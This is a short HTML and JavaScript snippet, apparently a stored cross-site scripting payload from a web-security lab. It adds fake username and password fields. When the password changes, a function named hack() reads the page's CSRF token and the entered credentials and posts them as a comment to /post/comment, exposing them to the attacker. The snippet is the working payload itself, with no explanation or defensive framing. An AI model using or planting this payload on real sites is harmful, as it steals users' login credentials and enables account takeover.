<input type=text name="username">
<input type=password name="password" onchange="hack()">
<script>
function hack() {
  var token = document.getElementsByName('csrf')[0].value;
  var username = document.getElementsByName('username')[0].value;
  var password = document.getElementsByName('password')[0].value;
  
  var data = new FormData();
  data.append('csrf', token);
  data.append('postId', 3);
  data.append('comment', `${username}:${password}`);
  data.append('name', 'admin');
  data.append('email', 'victim@gmail.com');
  data.append('website', 'http://localhost:80');
  
  fetch('/post/comment', {
    method: 'POST',
    mode: 'no-cors',
    body: data
  });
}
</script>
